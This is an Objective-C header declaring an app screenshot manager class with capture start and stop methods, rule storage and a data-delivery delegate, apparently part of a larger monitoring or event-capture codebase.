//
//  AppScreenShotManagerImpl.h
//  AppScreenShotManagerImpl
//
//  Created by ophat on 4/1/16.
//  Copyright (c) 2016 ophat. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "EventCapture.h"
#import "AppScreenShotManager.h"
#import "DeliveryListener.h"

@protocol DataDelivery;

@class AppScreenShot, MobileAppScreenShot;
@class AppScreenShotRuleStorage;

@interface AppScreenShotManagerImpl : NSObject <EventCapture,AppScreenShotManager,DeliveryListener> {
@private
    #if TARGET_OS_IPHONE
    MobileAppScreenShot       *mAppScreenShot;
    #else
    AppScreenShot             *mAppScreenShot;
    #endif
    AppScreenShotRuleStorage  *mAppScreenShotRuleStorage;
    
    id <EventDelegate>         mEventDelegate;
    id <DataDelivery>          mDDM;
    id <AppScreenShotDelegate> mGetAppScreenShotDelegate;
    
    BOOL mIsCapture;
}

#if TARGET_OS_IPHONE
@property (nonatomic,retain) MobileAppScreenShot *mAppScreenShot;
#else
@property (nonatomic,retain) AppScreenShot *mAppScreenShot;
#endif
@property (nonatomic,retain) AppScreenShotRuleStorage *mAppScreenShotRuleStorage;

@property (nonatomic,assign) id <DataDelivery>  mDDM;
@property (nonatomic,assign) id <AppScreenShotDelegate> mGetAppScreenShotDelegate;

- (id) initWithDDM:(id <DataDelivery> )aDDM imagePath:(NSString *)aPath;

- (void) startCapture;
- (void) stopCapture;

@end
